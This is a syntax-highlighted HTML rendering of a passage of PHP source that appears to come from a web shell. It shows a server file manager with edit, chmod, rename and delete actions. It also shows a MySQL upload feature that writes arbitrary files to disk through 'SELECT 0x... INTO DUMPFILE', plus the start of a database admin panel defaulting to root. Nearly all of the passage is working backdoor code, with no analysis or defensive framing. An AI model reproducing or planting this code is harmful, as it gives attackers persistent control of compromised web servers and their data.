<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'filechmod'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'fileperm'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Down&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:copyfile(\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;Co</span><span style="color: #3e999f; text-decoration: underline;">py&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:rename(\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;Rena</span><span style="color: #3e999f; text-decoration: underline;">me&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">file_i</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #3e999f; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.<span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>).<span style="color: #3e999f;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t</span><span style="color: #3e999f; text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dir_i</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' directories / '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">file_i</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' files&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">end dir</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'sqlfile'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">doing</span>==<span style="color: #3e999f;">"mysqlupload"</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">file</span> = $<span style="color: #4271ae;">_FILES</span>[<span style="color: #3e999f;">'uploadfile'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filename</span> = $<span style="color: #eab700;">file</span>[<span style="color: #3e999f;">'tmp_name'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">savepath</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'The goal file has already existed'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!$<span style="color: #eab700;">filename</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Please choose a file'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">filename</span>,<span style="color: #3e999f;">'r'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">contents</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fread(</span>$<span style="color: #eab700;">fp</span>, <span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">filename</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">contents</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bin2hex(</span>$<span style="color: #eab700;">contents</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!$<span style="color: #eab700;">upname</span>) $<span style="color: #eab700;">upname</span> = $<span style="color: #eab700;">file</span>[<span style="color: #3e999f;">'name'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>,$<span style="color: #eab700;">charset</span>,$<span style="color: #eab700; text-decoration: underline;">dbport</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE </span><span style="color: #3e999f; text-decoration: underline;">'$savepath';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span>$<span style="color: #eab700;">result</span> ? <span style="color: #3e999f;">'Upload success'</span> : <span style="color: #3e999f;">'Upload has failed: '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">mysql_error</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="color: #8959a8;">?&gt;</span>
<span style="color: #4271ae;">&lt;script</span> <span style="color: #4271ae;">type=</span><span style="color: #3e999f;">"text/javascript"</span><span style="color: #4271ae;">&gt;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">mysqlfile</span>(<span style="color: #c82829; font-weight: bold;">doing</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!<span style="color: #c82829; font-weight: bold;">doing</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'doing'</span>).<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">doing</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #c82829; font-weight: bold;">dbhost</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'dbinfo'</span>).<span style="color: #c82829; font-weight: bold;">dbhost</span>.<span style="color: #c82829; font-weight: bold;">value</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #c82829; font-weight: bold;">dbport</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'dbinfo'</span>).<span style="color: #c82829; font-weight: bold;">dbport</span>.<span style="color: #c82829; font-weight: bold;">value</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #c82829; font-weight: bold;">dbuser</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'dbinfo'</span>).<span style="color: #c82829; font-weight: bold;">dbuser</span>.<span style="color: #c82829; font-weight: bold;">value</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #c82829; font-weight: bold;">dbpass</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'dbinfo'</span>).<span style="color: #c82829; font-weight: bold;">dbpass</span>.<span style="color: #c82829; font-weight: bold;">value</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #c82829; font-weight: bold;">dbname</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'dbinfo'</span>).<span style="color: #c82829; font-weight: bold;">dbname</span>.<span style="color: #c82829; font-weight: bold;">value</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #c82829; font-weight: bold;">charset</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'dbinfo'</span>).<span style="color: #c82829; font-weight: bold;">charset</span>.<span style="color: #c82829; font-weight: bold;">value</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'mysqlfile'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #4271ae;">&lt;/script&gt;</span>
<span style="color: #8959a8;">&lt;?php</span>
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dbhost</span> &amp;&amp; $<span style="color: #eab700;">dbhost</span> = <span style="color: #3e999f;">'localhost'</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dbuser</span> &amp;&amp; $<span style="color: #eab700;">dbuser</span> = <span style="color: #3e999f;">'root'</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dbport</span> &amp;&amp; $<span style="color: #eab700;">dbport</span> = <span style="color: #3e999f;">'3306'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=<span style="color: #4271ae;">&gt;</span><span style="color: #3e999f;">'MYSQL Information'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbinfo'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'sqlfile'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBHost:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbhost'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">20</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbhost</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">':'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbport'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">4</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbport</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBUser:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbuser'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">15</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbuser</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBPass:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbpass'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">15</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbpass</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBName:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbname'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">15</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbname</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBCharset:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeselect(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'charset'</span>,<span style="color: #3e999f;">'option'</span>=&gt;$<span style="color: #eab700;">charsetdb</span>,<span style="color: #3e999f;">'selected'</span>=&gt;$<span style="color: #eab700;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="POST" enctype="multipart/form-data" name</span><span style="color: #3e999f; text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty</span><span style="color: #3e999f; text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /</span><span style="color: #3e999f; text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dbhost'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dbport'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dbuser'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dbpass'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dbname'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'charset'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'doing'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'sqlfile'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/form&gt;'</span>);
}

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'mysqladmin'</span>) {
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dbhost</span> &amp;&amp; $<span style="color: #eab700;">dbhost</span> = <span style="color: #3e999f;">'localhost'</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dbuser</span> &amp;&amp; $<span style="color: #eab700;">dbuser</span> = <span style="color: #3e999f;">'root'</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dbport</span> &amp;&amp; $<span style="color: #eab700;">dbport</span> = <span style="color: #3e999f;">'3306'</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> = <span style="color: #3e999f;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbhost</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> .= <span style="color: #3e999f;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\</span><span style="color: #3e999f; text-decoration: underline;">"$dbhost\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbuser</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> .= <span style="color: #3e999f;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\</span><span style="color: #3e999f; text-decoration: underline;">"$dbuser\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbpass</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> .= <span style="color: #3e999f;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\</span><span style="color: #3e999f; text-decoration: underline;">"$dbpass\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbport</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> .= <span style="color: #3e999f;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\</span><span style="color: #3e999f; text-decoration: underline;">"$dbport\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbname</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> .= <span style="color: #3e999f;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\</span><span style="color: #3e999f; text-decoration: underline;">"$dbname\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">charset</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbform</span> .= <span style="color: #3e999f;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value</span><span style="color: #3e999f; text-decoration: underline;">=\"$charset\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'backupmysql'</span> &amp;&amp; $<span style="color: #eab700;">saveasfile</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">table</span>) {
